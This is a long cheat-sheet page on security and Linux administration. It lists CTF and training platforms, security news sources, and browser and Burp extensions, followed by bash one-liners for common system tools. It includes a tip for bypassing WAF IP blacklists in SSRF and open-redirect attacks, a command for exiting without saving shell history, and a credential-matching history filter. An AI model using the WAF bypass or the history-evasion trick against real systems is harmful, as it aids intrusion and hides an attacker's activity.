href=https://microcorruption.com/login><b>Microcorruption</b></a> - reversal challenges done in the web interface.<br><a href=https://crackmes.one/><b>Crackmes</b></a> - download crackmes to help improve your reverse engineering skills.<br><a href=https://domgo.at/cxss/intro><b>DomGoat</b></a> - DOM XSS security learning and practicing platform.<br><a href=https://chall.stypr.com><b>Stereotyped Challenges</b></a> - upgrade your web hacking techniques today!<br><a href=http://overthewire.org/wargames/><b>OverTheWire</b></a> - can help you to learn and practice security concepts in the form of fun-filled games.<br><a href=https://www.vulnhub.com/><b>Vulnhub</b></a> - allows anyone to gain practical 'hands-on' experience in digital security.<br><a href=https://w3challs.com/><b>W3Challs</b></a> - is a penetration testing training platform, which offers various computer challenges.<br><a href=https://ringzer0ctf.com/challenges><b>RingZer0 CTF</b></a> - offers you tons of challenges designed to test and improve your hacking skills.<br><a href=https://hack.me/><b>Hack.me</b></a> - a platform where you can build, host and share vulnerable web apps for educational and research purposes.<br><a href=https://www.hackthis.co.uk/levels/><b>HackThis!</b></a> - discover how hacks, dumps and defacements are performed and secure your website against hackers.<br><a href=https://www.enigmagroup.org/#><b>Enigma Group WebApp Training</b></a> - these challenges cover the exploits listed in the OWASP Top 10 Project.<br><a href=https://challenges.re/><b>Reverse Engineering Challenges</b></a> - challenges, exercises, problems and tasks - by level, by type, and more.<br><a href=https://0x00sec.org/><b>0x00sec</b></a> - the home of the Hacker - Malware, Reverse Engineering, and Computer Science.<br><a href=https://www.wechall.net/challs><b>We Chall</b></a> - there are exist a lots of different challenge types.<br><a href=https://www.hackergateway.com/><b>Hacker Gateway</b></a> - is the go-to place for hackers who want to test their skills.<br><a href=https://www.hacker101.com/><b>Hacker101</b></a> - is a free class for web security.<br><a href=https://contained.af/><b>contained.af</b></a> - a stupid game for learning about containers, capabilities, and syscalls.<br><a href=http://flaws.cloud/><b>flAWS challenge!</b></a> - a series of levels you'll learn about common mistakes and gotchas when using AWS.<br><a href=https://cybersecurity.wtf><b>CyberSec WTF</b></a> - provides web hacking challenges derived from bounty write-ups.<br><a href=https://ctfchallenge.co.uk/login><b>CTF Challenge</b></a> - CTF Web App challenges.<br><a href=https://capturetheflag.withgoogle.com><b>gCTF</b></a> - most of the challenges used in the Google CTF 2017.<br><a href=https://www.hackthissite.org/pages/index/index.php><b>Hack This Site</b></a> - is a free, safe and legal training ground for hackers.<br><a href=https://attackdefense.com><b>Attack & Defense</b></a> - is a browser-based cloud labs.<br><h5><a class=header href=#ctf-platforms id=ctf-platforms>CTF platforms</a></h5><p><a href=https://github.com/facebook/fbctf><b>fbctf</b></a> - platform to host Capture the Flag competitions.<br><a href=https://github.com/google/ctfscoreboard><b>ctfscoreboard</b></a> - scoreboard for Capture The Flag competitions.<br><h5><a class=header href=#other-resources id=other-resources>Other resources</a></h5><p><a href=https://github.com/bugcrowd/bugcrowd_university><b>Bugcrowd University</b></a> - open source education content for the researcher community.<br><a href=https://github.com/rewardone/OSCPRepo><b>OSCPRepo</b></a> - a list of resources and scripts that I have been gathering in preparation for the OSCP.<br><a href=https://medium.com/@cxosmo/owasp-top-10-real-world-examples-part-1-a540c4ea2df5><b>OWASP Top 10: Real-World Examples</b></a> - test your web apps with real-world examples (two-part series).<br><a href=http://phrack.org/index.html><b>phrack.org</b></a> - an awesome collection of articles from several respected hackers and other thinkers.<br><h4><a class=header href=#your-daily-knowledge-and-news-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=your-daily-knowledge-and-news-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Your daily knowledge and news <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#rss-readers id=rss-readers>RSS Readers</a></h5><p><a href=https://feedly.com/><b>Feedly</b></a> - organize, read and share what matters to you.<br><a href=https://www.inoreader.com/><b>Inoreader</b></a> - similar to feedly with a support for filtering what you fetch from rss.<br><h5><a class=header href=#irc-channels id=irc-channels>IRC Channels</a></h5><p><a href=https://wiki.hackerspaces.org/IRC_Channel><b>#hackerspaces</b></a> - hackerspace IRC channels.<br><h5><a class=header href=#security-1 id=security-1>Security</a></h5><p><a href=https://thehackernews.com/><b>The Hacker News</b></a> - leading news source dedicated to promoting awareness for security experts and hackers.<br><a href=https://latesthackingnews.com/><b>Latest Hacking News</b></a> - provides the latest hacking news, exploits and vulnerabilities for ethical hackers.<br><a href=https://securitynewsletter.co/><b>Security Newsletter</b></a> - security news as a weekly digest (email notifications).<br><a href=https://security.googleblog.com/><b>Google Online Security Blog</b></a> - the latest news and insights from Google on security and safety on the Internet.<br><a href=https://blog.qualys.com/><b>Qualys Blog</b></a> - expert network security guidance and news.<br><a href=https://www.darkreading.com/><b>DARKReading</b></a> - connecting the Information Security Community.<br><a href=https://www.darknet.org.uk/><b>Darknet</b></a> - latest hacking tools, hacker news, cybersecurity best practices, ethical hacking & pen-testing.<br><a href=https://twitter.com/disclosedh1><b>publiclyDisclosed</b></a> - public disclosure watcher who keeps you up to date about the recently disclosed bugs.<br><a href=https://www.reddit.com/r/hacking/><b>Reddit - Hacking</b></a> - a subreddit dedicated to hacking and hackers.<br><a href=https://packetstormsecurity.com/><b>Packet Storm</b></a> - information security services, news, files, tools, exploits, advisories and whitepapers.<br><a href=https://sekurak.pl/><b>Sekurak</b></a> - about security, penetration tests, vulnerabilities and many others (PL/EN).<br><a href=https://nfsec.pl/><b>nf.sec</b></a> - basic aspects and mechanisms of Linux operating system security (PL).<br><h5><a class=header href=#otherall-in-one id=otherall-in-one>Other/All-in-one</a></h5><p><a href=https://changelog.com/><b>Changelog</b></a> - is a community of hackers; news & podcasts for developers and hackers.<br><h4><a class=header href=#other-cheat-sheets-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=other-cheat-sheets-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Other Cheat Sheets <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h6><a class=header href=#build-your-own-dns-servers id=build-your-own-dns-servers>Build your own DNS Servers</a></h6><p><a href=https://calomel.org/unbound_dns.html><b>Unbound DNS Tutorial</b></a> - a validating, recursive, and caching DNS server.<br><a href=https://www.ctrl.blog/entry/knot-dns-resolver-tutorial.html><b>Knot Resolver on Fedora</b></a> - how to get faster and more secure DNS resolution with Knot Resolver on Fedora.<br><a href=https://www.aaflalo.me/2018/10/tutorial-setup-dns-over-https-server/><b>DNS-over-HTTPS</b></a> - tutorial to setup your own DNS-over-HTTPS (DoH) server.<br><a href=https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/><b>dns-over-https</b></a> - a cartoon intro to DNS over HTTPS.<br><a href=https://www.aaflalo.me/2019/03/dns-over-tls/><b>DNS-over-TLS</b></a> - following to your DoH server, setup your DNS-over-TLS (DoT) server.<br><a href=https://zwischenzugs.com/2018/01/26/how-and-why-i-run-my-own-dns-servers/><b>DNS Servers</b></a> - how (and why) i run my own DNS Servers.<br><h6><a class=header href=#build-your-own-certificate-authority id=build-your-own-certificate-authority>Build your own Certificate Authority</a></h6><p><a href=https://jamielinux.com/docs/openssl-certificate-authority/><b>OpenSSL Certificate Authority</b></a> - build your own certificate authority (CA) using the OpenSSL command-line tools.<br><a href=https://github.com/smallstep/certificates><b>step-ca Certificate Authority</b></a> - build your own certificate authority (CA) using open source step-ca.<br><h6><a class=header href=#build-your-own-systemvirtual-machine id=build-your-own-systemvirtual-machine>Build your own System/Virtual Machine</a></h6><p><a href=https://github.com/cfenollosa/os-tutorial><b>os-tutorial</b></a> - how to create an OS from scratch.<br><a href=https://justinmeiners.github.io/lc3-vm/><b>Write your Own Virtual Machine</b></a> - how to write your own virtual machine (VM).<br><a href=https://github.com/cirosantilli/x86-bare-metal-examples><b>x86 Bare Metal Examples</b></a> - dozens of minimal operating systems to learn x86 system programming.<br><a href=https://github.com/djhworld/simple-computer><b>simple-computer</b></a> - the scott CPU from "But How Do It Know?" by J. Clark Scott.<br><h6><a class=header href=#dns-servers-list-privacy id=dns-servers-list-privacy>DNS Servers list (privacy)</a></h6><table><thead><tr><th align=left><b><u>IP</u></b><th align=left><b><u>URL</u></b><tbody><tr><td align=left><strong><code>84.200.69.80</code></strong><td align=left><a href=https://dns.watch/>dns.watch</a><tr><td align=left><strong><code>94.247.43.254</code></strong><td align=left><a href=https://www.opennic.org/>opennic.org</a><tr><td align=left><strong><code>64.6.64.6</code></strong><td align=left><a href=https://www.verisign.com/en_US/security-services/public-dns/index.xhtml>verisign.com</a><tr><td align=left><strong><code>89.233.43.71</code></strong><td align=left><a href=https://blog.uncensoreddns.org/>censurfridns.dk</a><tr><td align=left><strong><code>1.1.1.1</code></strong><td align=left><a href=https://1.1.1.1/>cloudflare.com</a><tr><td align=left><strong><code>94.130.110.185</code></strong><td align=left><a href=https://dnsprivacy.at/>dnsprivacy.at</a></table><h6><a class=header href=#top-browser-extensions id=top-browser-extensions>TOP Browser extensions</a></h6><table><thead><tr><th align=left><b><u>Extension name</u></b><th align=left><b><u>Description</u></b><tbody><tr><td align=left><strong><code>IPvFoo</code></strong><td align=left>Display the server IP address and HTTPS information across all page elements.<tr><td align=left><strong><code>FoxyProxy</code></strong><td align=left>Simplifies configuring browsers to access proxy-servers.<tr><td align=left><strong><code>HTTPS Everywhere</code></strong><td align=left>Automatically use HTTPS security on many sites.<tr><td align=left><strong><code>uMatrix</code></strong><td align=left>Point & click to forbid/allow any class of requests made by your browser.<tr><td align=left><strong><code>uBlock Origin</code></strong><td align=left>An efficient blocker: easy on memory and CPU footprint.<tr><td align=left><strong><code>Session Buddy</code></strong><td align=left>Manage browser tabs and bookmarks with ease.<tr><td align=left><strong><code>SuperSorter</code></strong><td align=left>Sort bookmarks recursively, delete duplicates, merge folders and more.<tr><td align=left><strong><code>Clear Cache</code></strong><td align=left>Clear your cache and browsing data.<tr><td align=left><strong><code>d3coder</code></strong><td align=left>Encoding/Decoding plugin for various types of encoding.<tr><td align=left><strong><code>Web Developer</code></strong><td align=left>Adds a toolbar button with various web developer tools.<tr><td align=left><strong><code>ThreatPinch Lookup</code></strong><td align=left>Add threat intelligence hover tool tips.</table><h6><a class=header href=#top-burp-extensions id=top-burp-extensions>TOP Burp extensions</a></h6><table><thead><tr><th align=left><b><u>Extension name</u></b><th align=left><b><u>Description</u></b><tbody><tr><td align=left><strong><code>Autorize</code></strong><td align=left>Automatically detects authorization enforcement.<tr><td align=left><strong><code>Reflection</code></strong><td align=left>An efficient blocker: easy on memory and CPU footprint.<tr><td align=left><strong><code>Logger++</code></strong><td align=left>Logs requests and responses for all Burp tools in a sortable table.<tr><td align=left><strong><code>Bypass WAF</code></strong><td align=left>Adds headers useful for bypassing some WAF devices.<tr><td align=left><strong><code>JSON Beautifier</code></strong><td align=left>Beautifies JSON content in the HTTP message viewer.<tr><td align=left><strong><code>JSON Web Tokens</code></strong><td align=left>Enables Burp to decode and manipulate JSON web tokens.<tr><td align=left><strong><code>CSP Auditor</code></strong><td align=left>Displays CSP headers for responses, and passively reports CSP weaknesses.<tr><td align=left><strong><code>CSP-Bypass</code></strong><td align=left>Passively scans for CSP headers that contain known bypasses.<tr><td align=left><strong><code>Hackvertor</code></strong><td align=left>Converts data using a tag-based configuration to apply various encoding.<tr><td align=left><strong><code>Active Scan++</code></strong><td align=left>Extends Burp's active and passive scanning capabilities.<tr><td align=left><strong><code>HTML5 Auditor</code></strong><td align=left>Scans for usage of risky HTML5 features.<tr><td align=left><strong><code>Software Vulnerability Scanner</code></strong><td align=left>Software vulnerability scanner based on Vulners.com audit API.</table><h6><a class=header href=#hack-mozilla-firefox-addressbar id=hack-mozilla-firefox-addressbar>Hack Mozilla Firefox addressbar</a></h6><p>In Firefox's addressbar, you can limit results by typing special characters before or after your term:<ul><li><code>^</code> - for matches in your browsing history<li><code>*</code> - for matches in your bookmarks.<li><code>%</code> - for matches in your currently open tabs.<li><code>#</code> - for matches in page titles.<li><code>@</code> - for matches in web addresses.</ul><h6><a class=header href=#bypass-wafs-by-shortening-ip-address-by-a-hrefhttpstwittercom0xinfection0xinfectiona id=bypass-wafs-by-shortening-ip-address-by-a-hrefhttpstwittercom0xinfection0xinfectiona>Bypass WAFs by Shortening IP Address (by <a href=https://twitter.com/0xInfection>0xInfection</a>)</a></h6><p>IP addresses can be shortened by dropping the zeroes:<pre><code>http://1.0.0.1 → http://1.1
http://127.0.0.1 → http://127.1
http://192.168.0.1 → http://192.168.1

http://0xC0A80001 or http://3232235521 → 192.168.0.1
http://192.168.257 → 192.168.1.1
http://192.168.516 → 192.168.2.4
</code></pre><blockquote><p>This bypasses WAF filters for SSRF, open-redirect, etc where any IP as input gets blacklisted.</blockquote><p>For more information please see <a href=http://www.pc-help.org/obscure.htm>How to Obscure Any URL</a> and <a href=https://stuff-things.net/2014/09/25/magic-ip-address-shortcuts/>Magic IP Address Shortcuts</a>.<h4><a class=header href=#one-liners-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=one-liners-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>One-liners <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#table-of-contents-1 id=table-of-contents-1>Table of Contents</a></h5><ul><li><a href=MISCELLANEOUS.html#tool-terminal>terminal</a><li><a href=MISCELLANEOUS.html#tool-mount>mount</a><li><a href=MISCELLANEOUS.html#tool-fuser>fuser</a><li><a href=MISCELLANEOUS.html#tool-lsof>lsof</a><li><a href=MISCELLANEOUS.html#tool-ps>ps</a><li><a href=MISCELLANEOUS.html#tool-top>top</a><li><a href=MISCELLANEOUS.html#tool-vmstat>vmstat</a><li><a href=MISCELLANEOUS.html#tool-iostat>iostat</a><li><a href=MISCELLANEOUS.html#tool-strace>strace</a><li><a href=MISCELLANEOUS.html#tool-kill>kill</a><li><a href=MISCELLANEOUS.html#tool-find>find</a><li><a href=MISCELLANEOUS.html#tool-diff>diff</a><li><a href=MISCELLANEOUS.html#tool-vimdiff>vimdiff</a><li><a href=MISCELLANEOUS.html#tool-tail>tail</a><li><a href=MISCELLANEOUS.html#tool-cpulimit>cpulimit</a><li><a href=MISCELLANEOUS.html#tool-pwdx>pwdx</a><li><a href=MISCELLANEOUS.html#tool-tr>tr</a><li><a href=MISCELLANEOUS.html#tool-chmod>chmod</a><li><a href=MISCELLANEOUS.html#tool-who>who</a><li><a href=MISCELLANEOUS.html#tool-last>last</a><li><a href=MISCELLANEOUS.html#tool-screen>screen</a><li><a href=MISCELLANEOUS.html#tool-script>script</a><li><a href=MISCELLANEOUS.html#tool-du>du</a><li><a href=MISCELLANEOUS.html#tool-inotifywait>inotifywait</a><li><a href=MISCELLANEOUS.html#tool-openssl>openssl</a><li><a href=MISCELLANEOUS.html#tool-secure-delete>secure-delete</a><li><a href=MISCELLANEOUS.html#tool-dd>dd</a><li><a href=MISCELLANEOUS.html#tool-gpg>gpg</a><li><a href=MISCELLANEOUS.html#tool-system-other>system-other</a><li><a href=MISCELLANEOUS.html#tool-curl>curl</a><li><a href=MISCELLANEOUS.html#tool-httpie>httpie</a><li><a href=MISCELLANEOUS.html#tool-ssh>ssh</a><li><a href=MISCELLANEOUS.html#tool-linux-dev>linux-dev</a><li><a href=MISCELLANEOUS.html#tool-tcpdump>tcpdump</a><li><a href=MISCELLANEOUS.html#tool-tcpick>tcpick</a><li><a href=MISCELLANEOUS.html#tool-ngrep>ngrep</a><li><a href=MISCELLANEOUS.html#tool-hping3>hping3</a><li><a href=MISCELLANEOUS.html#tool-nmap>nmap</a><li><a href=MISCELLANEOUS.html#tool-netcat>netcat</a><li><a href=MISCELLANEOUS.html#tool-socat>socat</a><li><a href=MISCELLANEOUS.html#tool-p0f>p0f</a><li><a href=MISCELLANEOUS.html#tool-gnutls-cli>gnutls-cli</a><li><a href=MISCELLANEOUS.html#tool-netstat>netstat</a><li><a href=MISCELLANEOUS.html#tool-rsync>rsync</a><li><a href=MISCELLANEOUS.html#tool-host>host</a><li><a href=MISCELLANEOUS.html#tool-dig>dig</a><li><a href=MISCELLANEOUS.html#tool-certbot>certbot</a><li><a href=MISCELLANEOUS.html#tool-network-other>network-other</a><li><a href=MISCELLANEOUS.html#tool-git>git</a><li><a href=MISCELLANEOUS.html#tool-awk>awk</a><li><a href=MISCELLANEOUS.html#tool-sed>sed</a><li><a href=MISCELLANEOUS.html#tool-grep>grep</a><li><a href=MISCELLANEOUS.html#tool-perl>perl</a></ul><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikilinux_consoleterminala id=tool-a-hrefhttpsenwikipediaorgwikilinux_consoleterminala>Tool: <a href=https://en.wikipedia.org/wiki/Linux_console>terminal</a></a></h5><h6><a class=header href=#reload-shell-without-exit id=reload-shell-without-exit>Reload shell without exit</a></h6><pre><code class=language-bash>exec $SHELL -l
</code></pre><h6><a class=header href=#close-shell-keeping-all-subprocess-running id=close-shell-keeping-all-subprocess-running>Close shell keeping all subprocess running</a></h6><pre><code class=language-bash>disown -a &amp;&amp; exit
</code></pre><h6><a class=header href=#exit-without-saving-shell-history id=exit-without-saving-shell-history>Exit without saving shell history</a></h6><pre><code class=language-bash>kill -9 $$
unset HISTFILE &amp;&amp; exit
</code></pre><h6><a class=header href=#perform-a-branching-conditional id=perform-a-branching-conditional>Perform a branching conditional</a></h6><pre><code class=language-bash>true &amp;&amp; echo success
false || echo failed
</code></pre><h6><a class=header href=#pipe-stdout-and-stderr-to-separate-commands id=pipe-stdout-and-stderr-to-separate-commands>Pipe stdout and stderr to separate commands</a></h6><pre><code class=language-bash>some_command &gt; &gt;(/bin/cmd_for_stdout) 2&gt; &gt;(/bin/cmd_for_stderr)
</code></pre><h6><a class=header href=#redirect-stdout-and-stderr-each-to-separate-files-and-print-both-to-the-screen id=redirect-stdout-and-stderr-each-to-separate-files-and-print-both-to-the-screen>Redirect stdout and stderr each to separate files and print both to the screen</a></h6><pre><code class=language-bash>(some_command 2&gt;&amp;1 1&gt;&amp;3 | tee errorlog ) 3&gt;&amp;1 1&gt;&amp;2 | tee stdoutlog
</code></pre><h6><a class=header href=#list-of-commands-you-use-most-often id=list-of-commands-you-use-most-often>List of commands you use most often</a></h6><pre><code class=language-bash>history | \
awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] &quot; &quot; CMD[a]/count*100 &quot;% &quot; a;}' | \
grep -v &quot;./&quot; | \
column -c3 -s &quot; &quot; -t | \
sort -nr | nl |  head -n 20
</code></pre><h6><a class=header href=#sterilize-bash-history id=sterilize-bash-history>Sterilize bash history</a></h6><pre><code class=language-bash>function sterile() {

  history | awk '$2 != &quot;history&quot; { $1=&quot;&quot;; print $0 }' | egrep -vi &quot;\
curl\b+.*(-E|--cert)\b+.*\b*|\
curl\b+.*--pass\b+.*\b*|\
curl\b+.*(-U|--proxy-user).*:.*\b*|\
curl\b+.*(-u|--user).*:.*\b*
.*(-H|--header).*(token|auth.*)\b+.*|\
wget\b+.*--.*password\b+.*\b*|\
http.?://.+:.+@.*\
&quot; &gt; $HOME/histbuff; history -r $HOME/histbuff;

}

export PROMPT_COMMAND=&quot;sterile&quot;
</code></pre><blockquote><p>Look also: <a href=https://github.com/lbonanomi/go/blob/master/revisionist.go>A naive utility to censor credentials in command history</a>.</blockquote><h6><a class=header href=#quickly-backup-a-file id=quickly-backup-a-file>Quickly backup a file</a></h6><pre><code class=language-bash>cp filename{,.orig}
</code></pre><h6><a class=header href=#empty-a-file-truncate-to-0-size id=empty-a-file-truncate-to-0-size>Empty a file (truncate to 0 size)</a></h6><pre><code class=language-bash>&gt;filename
</code></pre><h6><a class=header href=#delete-all-files-in-a-folder-that-dont-match-a-certain-file-extension id=delete-all-files-in-a-folder-that-dont-match-a-certain-file-extension>Delete all files in a folder that don't match a certain file extension</a></h6><pre><code class=language-bash>rm !(*.foo|*.bar|*.baz)
</code></pre><h6><a class=header href=#pass-multi-line-string-to-a-file id=pass-multi-line-string-to-a-file>Pass multi-line string to a file</a></h6><pre><code class=language-bash># cat  &gt;filename ... - overwrite the file
# cat &gt;&gt;filename ... - append to a file
cat &gt; filename &lt;&lt; __EOF__
data data data
__EOF__
</code></pre><h6><a class=header href=#edit-a-file-on-a-remote-host-using-vim id=edit-a-file-on-a-remote-host-using-vim>Edit a file on a remote host using vim</a></h6><pre><code class=language-bash>vim scp://user@host//etc/fstab
</code></pre><h6><a class=header href=#create-a-directory-and-change-into-it-at-the-same-time id=create-a-directory-and-change-into-it-at-the-same-time>Create a directory and change into it at the same time</a></h6><pre><code class=language-bash>mkd() { mkdir -p &quot;$@&quot; &amp;&amp; cd &quot;$@&quot;; }
</code></pre><h6><a class=header href=#convert-uppercase-files-to-lowercase-files id=convert-uppercase-files-to-lowercase-files>Convert uppercase files to lowercase files</a></h6><pre><code class=language-bash>rename 'y/A-Z/a-z/' *
</code></pre><h6><a class=header href=#print-a-row-of-characters-across-the-terminal id=print-a-row-of-characters-across-the-terminal>Print a row of characters across the terminal</a></h6><pre><code class=language-bash>printf &quot;%`tput cols`s&quot; | tr ' ' '#'
</code></pre><h6><a class=header href=#show-shell-history-without-line-numbers id=show-shell-history-without-line-numbers>Show shell history without line numbers</a></h6><pre><code class=language-bash>history | cut -c 8-
fc -l -n 1 | sed 's/^\s*//'
</code></pre><h6><a class=header href=#run-commands-after-exit-session id=run-commands-after-exit-session>Run command(s) after exit session</a></h6><pre><code class=language-bash>cat &gt; /etc/profile &lt;&lt; __EOF__
_after_logout() {

  username=$(whoami)

  for _pid in $(ps afx | grep sshd | grep &quot;$username&quot; | awk '{print $1}') ; do

    kill -9 $_pid

  done

}
trap _after_logout EXIT
__EOF__
</code></pre><h6><a class=header href=#generate-a-sequence-of-numbers id=generate-a-sequence-of-numbers>Generate a sequence of numbers</a></h6><pre><code class=language-bash>for ((i=1; i&lt;=10; i+=2)) ; do echo $i ; done
# alternative: seq 1 2 10

for ((i=5; i&lt;=10; ++i)) ; do printf '%02d\n' $i ; done
# alternative: seq -w 5 10

for i in {1..10} ; do echo $i ; done
</code></pre><h6><a class=header href=#simple-bash-filewatching id=simple-bash-filewatching>Simple Bash filewatching</a></h6><pre><code class=language-bash>unset MAIL; export MAILCHECK=1; export MAILPATH='$FILE_TO_WATCH?$MESSAGE'

</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikimount_unixmounta id=tool-a-hrefhttpsenwikipediaorgwikimount_unixmounta>Tool: <a href=https://en.wikipedia.org/wiki/Mount_(Unix)>mount</a></a></h5><h6><a class=header href=#mount-a-temporary-ram-partition id=mount-a-temporary-ram-partition>Mount a temporary ram partition</a></h6><pre><code class=language-bash>mount -t tmpfs tmpfs /mnt -o size=64M
</code></pre><ul><li><code>-t</code> - filesystem type<li><code>-o</code> - mount options</ul><h6><a class=header href=#remount-a-filesystem-as-readwrite id=remount-a-filesystem-as-readwrite>Remount a filesystem as read/write</a></h6><pre><code class=language-bash>mount -o remount,rw /
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikifuser_unixfusera id=tool-a-hrefhttpsenwikipediaorgwikifuser_unixfusera>Tool: <a href=https://en.wikipedia.org/wiki/Fuser_(Unix)>fuser</a></a></h5><h6><a class=header href=#show-which-processes-use-the-filesdirectories id=show-which-processes-use-the-filesdirectories>Show which processes use the files/directories</a></h6><pre><code class=language-bash>fuser /var/log/daemon.log
fuser -v /home/supervisor
</code></pre><h6><a class=header href=#kills-a-process-that-is-locking-a-file id=kills-a-process-that-is-locking-a-file>Kills a process that is locking a file</a></h6><pre><code class=language-bash>fuser -ki filename
</code></pre><ul><li><code>-i</code> - interactive option</ul><h6><a class=header href=#kills-a-process-that-is-locking-a-file-with-specific-signal id=kills-a-process-that-is-locking-a-file-with-specific-signal>Kills a process that is locking a file with specific signal</a></h6><pre><code class=language-bash>fuser -k -HUP filename
</code></pre><ul><li><code>--list-signals</code> - list available signal names</ul><h6><a class=header href=#show-what-pid-is-listening-on-specific-port id=show-what-pid-is-listening-on-specific-port>Show what PID is listening on specific port</a></h6><pre><code class=language-bash>fuser -v 53/udp
</code></pre><h6><a class=header href=#show-all-processes-using-the-named-filesystems-or-block-device id=show-all-processes-using-the-named-filesystems-or-block-device>Show all processes using the named filesystems or block device</a></h6><pre><code class=language-bash>fuser -mv /var/www
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikilsoflsofa id=tool-a-hrefhttpsenwikipediaorgwikilsoflsofa>Tool: <a href=https://en.wikipedia.org/wiki/Lsof>lsof</a></a></h5><h6><a class=header href=#show-process-that-use-internet-connection-at-the-moment id=show-process-that-use-internet-connection-at-the-moment>Show process that use internet connection at the moment</a></h6><pre><code class=language-bash>lsof -P -i -n
</code></pre><h6><a class=header href=#show-process-that-use-specific-port-number id=show-process-that-use-specific-port-number>Show process that use specific port number</a></h6><pre><code class=language-bash>lsof -i tcp:443
</code></pre><h6><a class=header href=#lists-all-listening-ports-together-with-the-pid-of-the-associated-process id=lists-all-listening-ports-together-with-the-pid-of-the-associated-process>Lists all listening ports together with the PID of the associated process</a></h6><pre><code class=language-bash>lsof -Pan -i tcp -i udp
</code></pre><h6><a class=header href=#list-all-open-ports-and-their-owning-executables id=list-all-open-ports-and-their-owning-executables>List all open ports and their owning executables</a></h6><pre><code class=language-bash>lsof -i -P | grep -i &quot;listen&quot;
</code></pre><h6><a class=header href=#show-all-open-ports id=show-all-open-ports>Show all open ports</a></h6><pre><code class=language-bash>lsof -Pnl -i
</code></pre><h6><a class=header href=#show-open-ports-listen id=show-open-ports-listen>Show open ports (LISTEN)</a></h6><pre><code class=language-bash>lsof -Pni4 | grep LISTEN | column -t
</code></pre><h6><a class=header href=#list-all-files-opened-by-a-particular-command id=list-all-files-opened-by-a-particular-command>List all files opened by a particular command</a></h6><pre><code class=language-bash>lsof -c &quot;process&quot;
</code></pre><h6><a class=header href=#view-user-activity-per-directory id=view-user-activity-per-directory>View user activity per directory</a></h6><pre><code class=language-bash>lsof -u username -a +D /etc
</code></pre><h6><a class=header href=#show-10-largest-open-files id=show-10-largest-open-files>Show 10 largest open files</a></h6><pre><code class=language-bash>lsof / | \
awk '{ if($7 &gt; 1048576) print $7/1048576 &quot;MB&quot; &quot; &quot; $9 &quot; &quot; $1 }' | \
sort -n -u | tail | column -t
</code></pre><h6><a class=header href=#show-current-working-directory-of-a-process id=show-current-working-directory-of-a-process>Show current working directory of a process</a></h6><pre><code class=language-bash>lsof -p &lt;PID&gt; | grep cwd
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikips_unixpsa id=tool-a-hrefhttpsenwikipediaorgwikips_unixpsa>Tool: <a href=https://en.wikipedia.org/wiki/Ps_(Unix)>ps</a></a></h5><h6><a class=header href=#show-a-4-way-scrollable-process-tree-with-full-details id=show-a-4-way-scrollable-process-tree-with-full-details>Show a 4-way scrollable process tree with full details</a></h6><pre><code class=language-bash>ps awwfux | less -S
</code></pre><h6><a class=header href=#processes-per-user-counter id=processes-per-user-counter>Processes per user counter</a></h6><pre><code class=language-bash>ps hax -o user | sort | uniq -c | sort -r
</code></pre><h6><a class=header href=#show-all-processes-by-name-with-main-header id=show-all-processes-by-name-with-main-header>Show all processes by name with main header</a></h6><pre><code class=language-bash>ps -lfC nginx
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikifind_unixfinda id=tool-a-hrefhttpsenwikipediaorgwikifind_unixfinda>Tool: <a href=https://en.wikipedia.org/wiki/Find_(Unix)>find</a></a></h5><h6><a class=header href=#find-files-that-have-been-modified-on-your-system-in-the-past-60-minutes id=find-files-that-have-been-modified-on-your-system-in-the-past-60-minutes>Find files that have been modified on your system in the past 60 minutes</a></h6><pre><code class=language-bash>find / -mmin 60 -type f
</code></pre><h6><a class=header href=#find-all-files-larger-than-20m id=find-all-files-larger-than-20m>Find all files larger than 20M</a></h6><pre><code class=language-bash>find / -type f -size +20M
</code></pre><h6><a class=header href=#find-duplicate-files-based-on-md5-hash id=find-duplicate-files-based-on-md5-hash>Find duplicate files (based on MD5 hash)</a></h6><pre><code class=language-bash>find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33
</code></pre><h6><a class=header href=#change-permission-only-for-files id=change-permission-only-for-files>Change permission only for files</a></h6><pre><code class=language-bash>cd /var/www/site &amp;&amp; find . -type f -exec chmod 766 {} \;
cd /var/www/site &amp;&amp; find . -type f -exec chmod 664 {} +
</code></pre><h6><a class=header href=#change-permission-only-for-directories id=change-permission-only-for-directories>Change permission only for directories</a></h6><pre><code class=language-bash>cd /var/www/site &amp;&amp; find . -type d -exec chmod g+x {} \;
cd /var/www/site &amp;&amp; find . -type d -exec chmod g+rwx {} +
</code></pre><h6><a class=header href=#find-files-and-directories-for-specific-user id=find-files-and-directories-for-specific-user>Find files and directories for specific user</a></h6><pre><code class=language-bash>find . -user &lt;username&gt; -print
</code></pre><h6><a class=header href=#find-files-and-directories-for-all-without-specific-user id=find-files-and-directories-for-all-without-specific-user>Find files and directories for all without specific user</a></h6><pre><code class=language-bash>find . \!-user &lt;username&gt; -print
</code></pre><h6><a class=header href=#delete-older-files-than-60-days id=delete-older-files-than-60-days>Delete older files than 60 days</a></h6><pre><code class=language-bash>find . -type f -mtime +60 -delete
</code></pre><h6><a class=header href=#recursively-remove-all-empty-sub-directories-from-a-directory id=recursively-remove-all-empty-sub-directories-from-a-directory>Recursively remove all empty sub-directories from a directory</a></h6><pre><code class=language-bash>find . -depth  -type d  -empty -exec rmdir {} \;
</code></pre><h6><a class=header href=#how-to-find-all-hard-links-to-a-file id=how-to-find-all-hard-links-to-a-file>How to find all hard links to a file</a></h6><pre><code class=language-bash>find &lt;/path/to/dir&gt; -xdev -samefile filename
